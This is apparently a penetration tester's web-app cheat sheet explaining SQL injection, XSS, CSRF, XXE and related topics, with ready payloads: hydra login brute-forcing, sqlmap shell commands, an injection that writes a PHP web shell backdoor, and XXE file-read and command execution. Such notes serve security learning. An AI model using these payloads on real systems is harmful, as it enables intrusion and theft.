---
layout: page
title: Web App
permalink: /web/
---

# Index

* [Authentication](#authentication)
* [SQL Injection](#sql-injection)
* [Cross Site Scripting](#cross-site-scripting)
* [PHP Injection](#php-injection)
* [Template Injection](#template-injection)
* [XML External Entity](#xml-external-entity)
* [Deserialization](#deserialization)
* [Storage](#storage)
* [HTTP Parameter Polution}(#http-parameter-polution)
* [Important Web Security Concepts](#important-web-security-concepts)
* [Other Tools](#other-tools)
* [Methodology](#methodology)


## Authentication

### Brute Forcing Online

`hydra`

For example attacking a web login form

`hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt`

### SSL/TLS

SSL/TLS are protocols used for encrypting information between two points.

The SSL Handshake is Asymmetric and the sending of data uses symmetric encryption.

The handshake protocol is:

1. The client sends the SSL versions and ciphers it can use to the server
2. Server selects a compatible version and cipher, then sends it's certificate + public key
3. Client checks the certificate & then generates a pre-master key, encrypts it with the servers public key and sends it back
4. Server decrypts the pre-master secret with it's private key, and then the client AND server both perform the same steps on the pre-master key to generate the *shared secret*
5. Client and server exchange messages to test the shared secret and say that all future communications will be encrypted with it.

---

## SQL Injection

SQL injection attack consists of insertion of a SQL query via the input data from the client to the application.

Suppose a SQL query like below, where parameters are received from user input

```SQL
SELECT id FROM users WHERE username='$username' AND password='$password';
```

If we managed to input data like below we could return unintended data.

```SQL
SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'
```

We can also save a request in burp and feed it into `sqlmap` or fuzz with `sqlmap` directly.

```
sqlmap
# sqlmap crawl  
sqlmap -u http://10.10.10.10 --crawl=1

# sqlmap dump sql database from saved request
sqlmap -r login.req --dbms=mysql --dump

# sqlmap web shell  
sqlmap -r login.req --os-shell

# sqlmap reverse shell
sqlmap -r login.req --os-pwn
```

SQL Injection Writing a file

```SQL
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

SQL Injection Reading a File

```SQL
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

SQL Fuzzing Strings

```SQL
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
```
---

## Cross Site Scripting XSS

XSS is the injection of client-side scripts into web pages viewed by other users. 

If we can inject XSS into a page, then we can redirect a user to server we control and grab their cookies for that page.

If the httponly flag is set on the cookies this tells the browser that only the server can access them, never the client. This means we can't dump the cookies as above. However with XSS we can still perform whatever actions the user can perform as the user without their control or consent.

We can also inject a beefsuite hook that allows use to perform many XSS feats, activate webcams, etc.

Test for wherever user input is reflect in the site with:

``` Javascript
    <h1>Test<h1>
    <script>alert('x')</script>
    <iframe src=javascript:alert(1)>
    <img src=x onerror=alert(1)>
```

Browsers often have XSS filters, but can be bypassed with iframes etc.

### Reflected

Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.

### DOM

DOM-based Cross-Site Scripting is the de-facto name for XSS bugs which are the result of active browser-side content on a page, typically JavaScript, obtaining user input and then doing something unsafe with it which leads to execution of injected code.

---

## Cross Site Request Forgery (CSRF)

If a user is logged into a website (has an active session/token) and at the same times accesses a malicious website then a CSRF attack can occur.

The malicious website is designed to submit a request to the website the user is logged in to without the user being aware.
Since the request will have the session cookie/token attached to it the website believes the request is valid and actions accordingly.

The referral header is sometimes used to try and minimize the risk of this attack, although it introduces issues with adblockers and anonymity plugins and features of browsers.

Ideally on the website that hosts the form a CSRF Token is assigned whenever a form is requested. Then when the form is submitted the token is attached. These should be unique and impossible to guess, so that when the malicious site attempts a request with the users cookies the CSRF doesn't match and nothing happens.

---

## PHP Injection

If we can inject the below string anywhere interpreted as php we get RCE.

`<?php system($_GET['cmd']); ?>`

If there is LFI the below might work

`site.php?lfi_path=php://input%00`

Other things to try https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

---

## Template Injection

Template Injection occurs when user input is embedded in a template in an unsafe manner. Various website use templates to construct pages, these have a syntax that can be escaped. Client Side Template Injection and Server Side Template Injection exist.

Can lead to full RCE as the templates are operated on by server side languages.

Test for with

```
{7*7}
```

---

## XML External Entity

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

Local file inclusion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Remote code exectuion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
Above is just proof of concept, other functions exist.

---

## Deserialization

Deserialization of untrusted data (user input) can escape whatever is parsing the data and sometimes perform code execution, include additional data, etc.

---

## Storage

HTML is a stateless protocol so continuity is achieved through storage.

### Cookies

Stores data that has to be sent back to the server with subsequent requests. Its expiration varies based on the type and the expiration duration can be set from either server-side or client-side (normally from server-side).
Cookies are primarily for server-side reading (can also be read on client-side), localStorage and sessionStorage can only be read on client-side.
Cookies can be made secure by setting the httpOnly flag as true for that cookie. This prevents client-side access to that cookie

### Local Storage

Stores data with no expiration date, and gets cleared only through JavaScript, or clearing the Browser cache / Locally Stored Data. Large storage capacity. Data is never natively sent to the server, can be achieved with JS.

### Session Storage

The sessionStorage object stores data only for a session, meaning that the data is stored until the browser (or tab) is closed.
Data is never natively transferred to the server, can be achieved with JS.

---

## HTTP Parameter Polution

Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways.

Test with curl against apis etc while entering multiple headers or the same body data values twice.

---

## Important Web Security Concepts

### Same Origin Policiy

Same Origin Policy permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin. An origin is defined as a combination of URI scheme, host name, and port number. This is a ket security concept that prevents a malicious script on one page from obtaining access to sensitive data on another web page.

### httponly

HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie. 

### Cross-Origin Resource Sharing (CORS)

CORS is a mechanism that uses additional HTTP headers to tell a browser to let a web application running at one origin to access selected resources from a server at a different origin. 

### Security.txt

Websites often define channels for responsible disclosure in a security.txt or /.well-known/security.txt
https://securitytxt.org/

---

## Other Tools

* w3af - Web Application Scanner
* wpscan - Scan wordpress
* droopscan - scan Drupal & Silverstripe CMS
* cewl - Scraping for strings

## Methodology

See:
* The Web Application Hacker's Handbook - Chapter 21
* https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/
